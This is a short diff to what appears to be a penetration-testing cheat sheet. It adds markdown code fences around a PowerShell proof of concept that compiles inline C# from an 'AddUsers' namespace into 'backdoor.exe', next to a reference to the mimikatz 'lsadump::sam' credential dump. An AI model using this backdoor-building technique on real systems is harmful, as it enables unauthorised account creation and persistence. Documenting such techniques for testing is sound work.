@@ -187,6 +187,7 @@ lsadump::sam
 You can compile c# code in powershell and create a binary.
 Run the following POC in powershell:
 
+```
 $code = @"
 using System;
 namespace AddUsers
@@ -207,3 +208,4 @@ namespace AddUsers
 }
 "@
 Add-Type -outputtype consoleapplication -outputassembly backdoor.exe -TypeDefinition $code -Language CSharp
+```
